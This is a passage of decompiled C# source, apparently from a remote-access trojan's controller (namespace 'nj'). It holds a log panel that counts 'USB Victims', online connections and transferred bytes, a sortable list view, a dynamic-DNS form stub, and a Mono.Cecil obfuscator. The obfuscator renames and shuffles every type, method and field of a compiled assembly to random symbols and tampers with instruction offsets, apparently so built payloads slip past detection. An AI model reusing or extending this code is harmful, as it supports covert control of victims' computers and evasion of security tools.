						logs.__ENCList.RemoveRange(num, logs.__ENCList.Count - num);
						logs.__ENCList.Capacity = logs.__ENCList.Count;
					}
					logs.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new Container();
			this.Label4 = new Label();
			this.USB = new Label();
			this.Label3 = new Label();
			this.Label1 = new Label();
			this.cn = new Label();
			this.snt = new Label();
			this.Label6 = new Label();
			this.rc = new Label();
			this.Timer1 = new Timer(this.components);
			this.Panel1 = new Panel();
			this.lgs = new RichTextBox();
			this.Panel1.SuspendLayout();
			this.SuspendLayout();
			this.Label4.AutoSize = true;
			this.Label4.BackColor = Color.Transparent;
			this.Label4.Cursor = Cursors.Hand;
			this.Label4.Font = new Font("Microsoft Sans Serif", 6f, FontStyle.Regular, GraphicsUnit.Point, 0);
			Control arg_109_0 = this.Label4;
			Point location = new Point(73, 53);
			arg_109_0.Location = location;
			this.Label4.Name = "Label4";
			Control arg_134_0 = this.Label4;
			Size size = new Size(20, 9);
			arg_134_0.Size = size;
			this.Label4.TabIndex = 33;
			this.Label4.Text = "Sent";
			this.Label4.Visible = false;
			this.USB.AutoSize = true;
			this.USB.BackColor = Color.Transparent;
			this.USB.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.USB.ForeColor = Color.Black;
			Control arg_1C5_0 = this.USB;
			location = new Point(86, 2);
			arg_1C5_0.Location = location;
			this.USB.Name = "USB";
			Control arg_1F0_0 = this.USB;
			size = new Size(14, 13);
			arg_1F0_0.Size = size;
			this.USB.TabIndex = 32;
			this.USB.Text = "0";
			this.Label3.AutoSize = true;
			this.Label3.BackColor = Color.Transparent;
			this.Label3.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label3.ForeColor = Color.Black;
			Control arg_273_0 = this.Label3;
			location = new Point(7, 2);
			arg_273_0.Location = location;
			this.Label3.Name = "Label3";
			Control arg_29E_0 = this.Label3;
			size = new Size(76, 13);
			arg_29E_0.Size = size;
			this.Label3.TabIndex = 31;
			this.Label3.Text = "USB Victims";
			this.Label1.AutoSize = true;
			this.Label1.BackColor = Color.Transparent;
			this.Label1.Font = new Font("Microsoft Sans Serif", 6f, FontStyle.Regular, GraphicsUnit.Point, 0);
			Control arg_312_0 = this.Label1;
			location = new Point(9, 53);
			arg_312_0.Location = location;
			this.Label1.Name = "Label1";
			Control arg_33D_0 = this.Label1;
			size = new Size(47, 9);
			arg_33D_0.Size = size;
			this.Label1.TabIndex = 30;
			this.Label1.Text = "Connections";
			this.Label1.Visible = false;
			this.cn.AutoSize = true;
			this.cn.BackColor = Color.Transparent;
			this.cn.Font = new Font("Microsoft Sans Serif", 6f, FontStyle.Regular, GraphicsUnit.Point, 0);
			Control arg_3BE_0 = this.cn;
			location = new Point(31, 66);
			arg_3BE_0.Location = location;
			this.cn.Name = "cn";
			Control arg_3E9_0 = this.cn;
			size = new Size(9, 9);
			arg_3E9_0.Size = size;
			this.cn.TabIndex = 29;
			this.cn.Text = "0";
			this.cn.Visible = false;
			this.snt.AutoSize = true;
			this.snt.BackColor = Color.Transparent;
			this.snt.Font = new Font("Microsoft Sans Serif", 6f, FontStyle.Regular, GraphicsUnit.Point, 0);
			Control arg_46A_0 = this.snt;
			location = new Point(73, 66);
			arg_46A_0.Location = location;
			this.snt.Name = "snt";
			Control arg_495_0 = this.snt;
			size = new Size(9, 9);
			arg_495_0.Size = size;
			this.snt.TabIndex = 28;
			this.snt.Text = "0";
			this.snt.Visible = false;
			this.Label6.AutoSize = true;
			this.Label6.BackColor = Color.Transparent;
			this.Label6.Cursor = Cursors.Hand;
			this.Label6.Font = new Font("Microsoft Sans Serif", 6f, FontStyle.Regular, GraphicsUnit.Point, 0);
			Control arg_527_0 = this.Label6;
			location = new Point(101, 53);
			arg_527_0.Location = location;
			this.Label6.Name = "Label6";
			Control arg_552_0 = this.Label6;
			size = new Size(29, 9);
			arg_552_0.Size = size;
			this.Label6.TabIndex = 27;
			this.Label6.Text = "Recive";
			this.Label6.Visible = false;
			this.rc.AutoSize = true;
			this.rc.BackColor = Color.Transparent;
			this.rc.Font = new Font("Microsoft Sans Serif", 6f, FontStyle.Regular, GraphicsUnit.Point, 0);
			Control arg_5D3_0 = this.rc;
			location = new Point(101, 66);
			arg_5D3_0.Location = location;
			this.rc.Name = "rc";
			Control arg_5FE_0 = this.rc;
			size = new Size(9, 9);
			arg_5FE_0.Size = size;
			this.rc.TabIndex = 26;
			this.rc.Text = "0";
			this.rc.Visible = false;
			this.Panel1.BackColor = Color.Black;
			this.Panel1.Controls.Add(this.Label1);
			this.Panel1.Controls.Add(this.Label4);
			this.Panel1.Controls.Add(this.rc);
			this.Panel1.Controls.Add(this.USB);
			this.Panel1.Controls.Add(this.Label6);
			this.Panel1.Controls.Add(this.Label3);
			this.Panel1.Controls.Add(this.snt);
			this.Panel1.Controls.Add(this.cn);
			Control arg_70A_0 = this.Panel1;
			location = new Point(0, 0);
			arg_70A_0.Location = location;
			this.Panel1.Name = "Panel1";
			Control arg_735_0 = this.Panel1;
			size = new Size(113, 27);
			arg_735_0.Size = size;
			this.Panel1.TabIndex = 34;
			Control arg_75C_0 = this.lgs;
			location = new Point(125, 99);
			arg_75C_0.Location = location;
			this.lgs.Name = "lgs";
			this.lgs.ReadOnly = true;
			Control arg_797_0 = this.lgs;
			size = new Size(341, 40);
			arg_797_0.Size = size;
			this.lgs.TabIndex = 35;
			this.lgs.Text = "";
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.Controls.Add(this.lgs);
			this.Controls.Add(this.Panel1);
			this.Name = "logs";
			size = new Size(148, 48);
			this.Size = size;
			this.Panel1.ResumeLayout(false);
			this.Panel1.PerformLayout();
			this.ResumeLayout(false);
		}

		public void Append(string T)
		{
			bool flag = this.lgs.TextLength > 40000;
			if (flag)
			{
				try
				{
					this.lgs.Text = this.lgs.Text.Remove(0, 20000);
				}
				catch (Exception expr_3C)
				{
					ProjectData.SetProjectError(expr_3C);
					ProjectData.ClearProjectError();
				}
			}
			this.lgs.AppendText(T + "\r\n");
			this.lgs.SelectionStart = checked(this.lgs.TextLength - 1);
			this.lgs.ScrollToCaret();
		}

		private void Label4_Click(object sender, EventArgs e)
		{
			sokserver.SNT = 0;
			sokserver.RC = 0;
		}

		private void Label6_Click(object sender, EventArgs e)
		{
			sokserver.SNT = 0;
			sokserver.RC = 0;
		}

		private void Lgs_Resize(object sender, EventArgs e)
		{
			try
			{
				this.lgs.ScrollToCaret();
			}
			catch (Exception expr_10)
			{
				ProjectData.SetProjectError(expr_10);
				ProjectData.ClearProjectError();
			}
		}

		private void Lgs_TextChanged(object sender, EventArgs e)
		{
		}

		private void Logs_Load(object sender, EventArgs e)
		{
			Control.CheckForIllegalCrossThreadCalls = false;
		}

		private void Panel1_Paint(object sender, PaintEventArgs e)
		{
		}

		private void Timer1_Tick(object sender, EventArgs e)
		{
			this.Timer1.Enabled = false;
			bool flag = sokserver.LG.Count > 0;
			if (flag)
			{
				this.Append(sokserver.LG[0]);
				sokserver.LG.RemoveAt(0);
			}
			int count = sokserver.F.L1V.Items.Count;
			this.USB.Text = Convert.ToString(sokserver.usb.Count);
			this.cn.Text = Convert.ToString(sokserver.W.Online2.Count);
			this.snt.Text = FN.Siz((long)sokserver.SNT);
			this.rc.Text = FN.Siz((long)sokserver.RC);
			sokserver.F.Text = string.Concat(new string[]
			{
				"Online { ",
				Convert.ToString(sokserver.F.L1V.Items.Count),
				" } ",
				sokserver.vr,
				" Port  { ",
				Convert.ToString(sokserver.F.port),
				"} \" Selected {0}    "
			});
			this.Timer1.Enabled = true;
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class LV : ListView
	{
		public class clsListviewSorter : IComparer
		{
			private int m_ColumnNumber;

			private SortOrder m_SortOrder;

			public clsListviewSorter(int column_number, SortOrder sort_order)
			{
				this.m_ColumnNumber = column_number;
				this.m_SortOrder = sort_order;
			}

			public int Compare(object x, object y)
			{
				ListViewItem listViewItem = (ListViewItem)x;
				ListViewItem listViewItem2 = (ListViewItem)y;
				bool flag = listViewItem.SubItems.Count <= this.m_ColumnNumber;
				string text;
				if (flag)
				{
					text = "";
				}
				else
				{
					text = listViewItem.SubItems[this.m_ColumnNumber].Text;
				}
				flag = (listViewItem2.SubItems.Count <= this.m_ColumnNumber);
				string text2;
				if (flag)
				{
					text2 = "";
				}
				else
				{
					text2 = listViewItem2.SubItems[this.m_ColumnNumber].Text;
				}
				flag = (this.m_SortOrder == SortOrder.Ascending);
				int result;
				if (flag)
				{
					bool flag2 = Versioned.IsNumeric(text) & Versioned.IsNumeric(text2);
					if (flag2)
					{
						result = Conversion.Val(text).CompareTo(Conversion.Val(text2));
					}
					else
					{
						flag2 = (Information.IsDate(text) & Information.IsDate(text2));
						if (flag2)
						{
							result = DateTime.Parse(text).CompareTo(DateTime.Parse(text2));
						}
						else
						{
							result = string.Compare(text, text2);
						}
					}
				}
				else
				{
					bool flag2 = Versioned.IsNumeric(text) & Versioned.IsNumeric(text2);
					if (flag2)
					{
						result = Conversion.Val(text2).CompareTo(Conversion.Val(text));
					}
					else
					{
						flag2 = (Information.IsDate(text) & Information.IsDate(text2));
						if (flag2)
						{
							result = DateTime.Parse(text2).CompareTo(DateTime.Parse(text));
						}
						else
						{
							result = string.Compare(text2, text);
						}
					}
				}
				return result;
			}
		}

		private static List<WeakReference> __ENCList = new List<WeakReference>();

		internal object Selected;

		private ColumnHeader m_SortingColumn;

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = LV.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = LV.__ENCList.Count == LV.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = LV.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = LV.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									LV.__ENCList[num] = LV.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						LV.__ENCList.RemoveRange(num, LV.__ENCList.Count - num);
						LV.__ENCList.Capacity = LV.__ENCList.Count;
					}
					LV.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		public LV()
		{
			base.ColumnClick += new ColumnClickEventHandler(this.ColumnClick);
			LV.__ENCAddToList(this);
			this.AllowDrop = false;
			this.Font = new Font("arial", 8f, FontStyle.Bold);
			this.Dock = DockStyle.Fill;
			this.FullRowSelect = true;
			this.View = View.Details;
			this.SetStyle(ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.SetStyle(ControlStyles.EnableNotifyMessage, true);
		}

		public void FX()
		{
			this.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
		}

		protected override void OnNotifyMessage(Message m)
		{
		}

		public new void ColumnClick(object sender, ColumnClickEventArgs e)
		{
			ColumnHeader columnHeader = (ColumnHeader)NewLateBinding.LateGet(sender, null, "Columns", new object[]
			{
				e.Column
			}, null, null, null);
			bool flag = this.m_SortingColumn == null;
			SortOrder sortOrder;
			bool flag2;
			if (flag)
			{
				sortOrder = SortOrder.Ascending;
			}
			else
			{
				flag = columnHeader.Equals(this.m_SortingColumn);
				if (flag)
				{
					flag2 = this.m_SortingColumn.Text.StartsWith("+");
					if (flag2)
					{
						sortOrder = SortOrder.Descending;
					}
					else
					{
						sortOrder = SortOrder.Ascending;
					}
				}
				else
				{
					sortOrder = SortOrder.Ascending;
				}
				this.m_SortingColumn.Text = this.m_SortingColumn.Text.Substring(1);
			}
			this.m_SortingColumn = columnHeader;
			flag2 = (sortOrder == SortOrder.Ascending);
			if (flag2)
			{
				this.m_SortingColumn.Text = "+" + this.m_SortingColumn.Text;
			}
			else
			{
				this.m_SortingColumn.Text = "-" + this.m_SortingColumn.Text;
			}
			flag2 = (sender == null);
			if (!flag2)
			{
				NewLateBinding.LateSet(sender, null, "ListViewItemSorter", new object[]
				{
					new LV.clsListviewSorter(e.Column, sortOrder)
				}, null, null);
				NewLateBinding.LateCall(sender, null, "Sort", new object[0], null, null, null, true);
				NewLateBinding.LateSet(sender, null, "ListViewItemSorter", new object[]
				{
					null
				}, null, null);
			}
		}
	}
}

using Mono.Cecil;
using Mono.Cecil.Cil;
using Mono.Collections.Generic;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class MON
	{
		public List<string> orn;

		public TextBox T1;

		public MON()
		{
			this.orn = new List<string>();
		}

		public Array RandArray(Array a)
		{
			List<object> list = new List<object>();
			list.AddRange((IEnumerable<object>)a);
			List<object> list2 = new List<object>();
			while (list.Count != 0)
			{
				int index = this.rnd(0, checked(list.Count - 1));
				list2.Add(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(list[index]))));
				list.RemoveAt(index);
			}
			return list2.ToArray();
		}

		public string randz(string f)
		{
			f = f.Replace("\"", "");
			bool flag = File.Exists(f + ".il");
			if (flag)
			{
				File.Delete(f + ".il");
			}
			File.Move(f, f + ".il");
			AssemblyDefinition assemblyDefinition = AssemblyDefinition.ReadAssembly(f + ".il");
			checked
			{
				try
				{
					Collection<ModuleDefinition>.Enumerator enumerator = assemblyDefinition.Modules.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ModuleDefinition current = enumerator.Current;
						this.wrt("Module: " + current.Name);
						try
						{
							Collection<TypeDefinition>.Enumerator enumerator2 = current.Types.GetEnumerator();
							while (enumerator2.MoveNext())
							{
								TypeDefinition current2 = enumerator2.Current;
								string text = this.RN();
								this.wrt("CLASS: " + current2.Name + " > " + text);
								current2.Name = text;
								try
								{
									Collection<PropertyDefinition>.Enumerator enumerator3 = current2.Properties.GetEnumerator();
									while (enumerator3.MoveNext())
									{
										PropertyDefinition current3 = enumerator3.Current;
										text = this.RN();
										this.wrt("Properties: " + current3.Name + " > " + text);
										current3.Name = text;
										text = this.RN();
										current3.PropertyType = current.Import(typeof(object));
										this.wrt("*Type " + current3.PropertyType.Name + " > " + text);
										current3.PropertyType.Name = text;
									}
								}
								finally
								{
									Collection<PropertyDefinition>.Enumerator enumerator3;
									((IDisposable)enumerator3).Dispose();
								}
								flag = (current2.Properties.Count > 0);
								if (flag)
								{
									IEnumerator enumerator4 = null;
									Array array = this.RandArray(current2.Properties.ToArray());
									current2.Properties.Clear();
									try
									{
										enumerator4 = array.GetEnumerator();
										while (enumerator4.MoveNext())
										{
											object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(enumerator4.Current)));
											current2.Properties.Add((PropertyDefinition)objectValue);
										}
									}
									finally
									{
										flag = (enumerator4 is IDisposable);
										if (flag)
										{
											(enumerator4 as IDisposable).Dispose();
										}
									}
								}
								try
								{
									Collection<EventDefinition>.Enumerator enumerator5 = current2.Events.GetEnumerator();
									while (enumerator5.MoveNext())
									{
										EventDefinition current4 = enumerator5.Current;
										text = this.RN();
										this.wrt("Event " + current4.Name + " > " + text);
										current4.Name = text;
										current4.EventType = current.Import(typeof(object));
										text = this.RN();
										this.wrt("*Type " + current4.EventType.Name + " > " + text);
										current4.EventType.Name = text;
									}
								}
								finally
								{
									Collection<EventDefinition>.Enumerator enumerator5;
									((IDisposable)enumerator5).Dispose();
								}
								flag = (current2.Events.Count > 0);
								if (flag)
								{
									IEnumerator enumerator6 = null;
									Array array2 = this.RandArray(current2.Events.ToArray());
									current2.Events.Clear();
									try
									{
										enumerator6 = array2.GetEnumerator();
										while (enumerator6.MoveNext())
										{
											object objectValue2 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(enumerator6.Current)));
											current2.Events.Add((EventDefinition)objectValue2);
										}
									}
									finally
									{
										flag = (enumerator6 is IDisposable);
										if (flag)
										{
											(enumerator6 as IDisposable).Dispose();
										}
									}
								}
								try
								{
									Collection<FieldDefinition>.Enumerator enumerator7 = current2.Fields.GetEnumerator();
									while (enumerator7.MoveNext())
									{
										FieldDefinition current5 = enumerator7.Current;
										text = this.RN();
										this.wrt("Field " + current5.Name + " > " + text);
										text = this.RN();
										this.wrt("*Type " + current5.FieldType.Name + " > " + text);
										current5.FieldType = current.Import(typeof(object));
										current5.FieldType.Name = text;
										current5.Name = text;
									}
								}
								finally
								{
									Collection<FieldDefinition>.Enumerator enumerator7;
									((IDisposable)enumerator7).Dispose();
								}
								flag = (current2.Fields.Count > 0);
								if (flag)
								{
									IEnumerator enumerator8 = null;
									Array array3 = this.RandArray(current2.Fields.ToArray());
									current2.Fields.Clear();
									try
									{
										enumerator8 = array3.GetEnumerator();
										while (enumerator8.MoveNext())
										{
											object objectValue3 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(enumerator8.Current)));
											current2.Fields.Add((FieldDefinition)objectValue3);
										}
									}
									finally
									{
										flag = (enumerator8 is IDisposable);
										if (flag)
										{
											(enumerator8 as IDisposable).Dispose();
										}
									}
								}
								try
								{
									Collection<MethodDefinition>.Enumerator enumerator9 = current2.Methods.GetEnumerator();
									while (enumerator9.MoveNext())
									{
										MethodDefinition current6 = enumerator9.Current;
										flag = !current6.ToString().Contains(".");
										if (flag)
										{
											text = this.RN();
											this.wrt("Method " + current6.Name + " > " + text);
											current6.Name = text;
											flag = current6.HasBody;
											if (flag)
											{
												try
												{
													Collection<Instruction>.Enumerator enumerator10 = current6.Body.Instructions.GetEnumerator();
													while (enumerator10.MoveNext())
													{
														Instruction current7 = enumerator10.Current;
														Instruction instruction = current7;
														instruction.Offset += -1;
													}
												}
												finally
												{
													Collection<Instruction>.Enumerator enumerator10;
													((IDisposable)enumerator10).Dispose();
												}
											}
											try
											{
												Collection<ParameterDefinition>.Enumerator enumerator11 = current6.Parameters.GetEnumerator();
												while (enumerator11.MoveNext())
												{
													ParameterDefinition current8 = enumerator11.Current;
													text = this.RN();
													this.wrt("*Param " + current8.Name + " > " + text);
													current8.Name = text;
												}
											}
											finally
											{
												Collection<ParameterDefinition>.Enumerator enumerator11;
												((IDisposable)enumerator11).Dispose();
											}
										}
									}
								}
								finally
								{
									Collection<MethodDefinition>.Enumerator enumerator9;
									((IDisposable)enumerator9).Dispose();
								}
								flag = (current2.Methods.Count > 0);
								if (flag)
								{
									IEnumerator enumerator12 = null;
									Array array4 = this.RandArray(current2.Methods.ToArray());
									current2.Methods.Clear();
									try
									{
										enumerator12 = array4.GetEnumerator();
										while (enumerator12.MoveNext())
										{
											object objectValue4 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(enumerator12.Current)));
											current2.Methods.Add((MethodDefinition)objectValue4);
										}
									}
									finally
									{
										flag = (enumerator12 is IDisposable);
										if (flag)
										{
											(enumerator12 as IDisposable).Dispose();
										}
									}
								}
							}
						}
						finally
						{
							Collection<TypeDefinition>.Enumerator enumerator2;
							((IDisposable)enumerator2).Dispose();
						}
					}
				}
				finally
				{
					Collection<ModuleDefinition>.Enumerator enumerator;
					((IDisposable)enumerator).Dispose();
				}
				assemblyDefinition.Write(f);
				File.Delete(f + ".il");
				string result;
				return result;
			}
		}

		public string RN()
		{
			checked
			{
				string text;
				do
				{
					Random random = new Random();
					text = "";
					string text2 = "☺☻♥♦♣♠•◘○◙♀♪♫☼►◄↕‼¶§▬↨↑↓→←∟↔▲▼ أآؤءئةابتثجحخدذرزسشصضطظعغفقكلمنهـوي";
					int num = random.Next(1, 3);
					for (int i = 1; i <= num; i++)
					{
						text += Convert.ToString(text2[random.Next(0, text2.Length)]);
					}
				}
				while (this.orn.Contains(text));
				this.orn.Add(text);
				return text;
			}
		}

		public int rnd(int min, int max)
		{
			Random random = new Random();
			return random.Next(min, checked(max + 1));
		}

		public void wrt(string t)
		{
			this.T1.AppendText(t + "\r\n");
			this.T1.ScrollToCaret();
			Application.DoEvents();
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class NO_IP : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("Label4")]
		private Label _Label4;

		[AccessedThroughProperty("TextBox2")]
		private LogInRichTextBox _TextBox2;

		[AccessedThroughProperty("TextBox1")]
		private LogInRichTextBox _TextBox1;

		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		[AccessedThroughProperty("Label3")]
		private Label _Label3;

		[AccessedThroughProperty("LogInLabel1")]
		private LogInLabel _LogInLabel1;

		[AccessedThroughProperty("Label2")]
		private Label _Label2;

		[AccessedThroughProperty("TextBox3")]
		private LogInRichTextBox _TextBox3;

		[AccessedThroughProperty("Button3")]
		private Button _Button3;

		[AccessedThroughProperty("LogInRichTextBox1")]
		private LogInRichTextBox _LogInRichTextBox1;

		[AccessedThroughProperty("LogInRichTextBox2")]
		private LogInRichTextBox _LogInRichTextBox2;

		[AccessedThroughProperty("LogInRichTextBox3")]
		private LogInRichTextBox _LogInRichTextBox3;

		[AccessedThroughProperty("LogInRichTextBox4")]
		private LogInRichTextBox _LogInRichTextBox4;

		[AccessedThroughProperty("LogInRichTextBox5")]
		private LogInRichTextBox _LogInRichTextBox5;

		[AccessedThroughProperty("RichTextBox1")]
		private RichTextBox _RichTextBox1;

		[AccessedThroughProperty("PictureBox2")]
		private PictureBox _PictureBox2;

		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		[AccessedThroughProperty("VisualStudioTabControl1")]
		private VisualStudioTabControl _VisualStudioTabControl1;

		[AccessedThroughProperty("TabPage1")]
		private TabPage _TabPage1;

		[AccessedThroughProperty("TabPage2")]
		private TabPage _TabPage2;

		internal virtual Label Label4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label4 = value;
			}
		}

		internal virtual LogInRichTextBox TextBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox2 = value;
			}
		}

		internal virtual LogInRichTextBox TextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox1 = value;
			}
		}

		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		internal virtual Label Label3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label3 = value;
			}
		}

		internal virtual LogInLabel LogInLabel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LogInLabel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LogInLabel1 = value;
			}
		}

		internal virtual Label Label2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label2 = value;
			}
		}

		internal virtual LogInRichTextBox TextBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox3 = value;
			}
		}

		internal virtual Button Button3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button3_Click);
				bool flag = this._Button3 != null;
				if (flag)
				{
					this._Button3.Click -= value2;
				}
				this._Button3 = value;
				flag = (this._Button3 != null);
				if (flag)
				{
					this._Button3.Click += value2;
				}
			}
		}

		internal virtual LogInRichTextBox LogInRichTextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LogInRichTextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LogInRichTextBox1 = value;
			}
		}

		internal virtual LogInRichTextBox LogInRichTextBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LogInRichTextBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LogInRichTextBox2 = value;
			}
		}

		internal virtual LogInRichTextBox LogInRichTextBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LogInRichTextBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LogInRichTextBox3 = value;
			}
		}

		internal virtual LogInRichTextBox LogInRichTextBox4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LogInRichTextBox4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LogInRichTextBox4 = value;
			}
		}

		internal virtual LogInRichTextBox LogInRichTextBox5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LogInRichTextBox5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LogInRichTextBox5 = value;
			}
		}

		internal virtual RichTextBox RichTextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RichTextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RichTextBox1 = value;
			}
		}

		internal virtual PictureBox PictureBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox2 = value;
			}
		}

		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click_1);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				flag = (this._Button1 != null);
				if (flag)
				{
					this._Button1.Click += value2;
				}
			}
		}

		internal virtual VisualStudioTabControl VisualStudioTabControl1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._VisualStudioTabControl1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._VisualStudioTabControl1 = value;
			}
		}

		internal virtual TabPage TabPage1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TabPage1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TabPage1 = value;
			}
		}

		internal virtual TabPage TabPage2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TabPage2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TabPage2 = value;
			}
		}

		[DebuggerNonUserCode]
		public NO_IP()
		{
			base.Load += new EventHandler(this.NO_IP_Load);
			NO_IP.__ENCAddToList(this);
			this.InitializeComponent();
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = NO_IP.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = NO_IP.__ENCList.Count == NO_IP.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = NO_IP.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = NO_IP.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									NO_IP.__ENCList[num] = NO_IP.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						NO_IP.__ENCList.RemoveRange(num, NO_IP.__ENCList.Count - num);
						NO_IP.__ENCList.Capacity = NO_IP.__ENCList.Count;
					}
					NO_IP.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
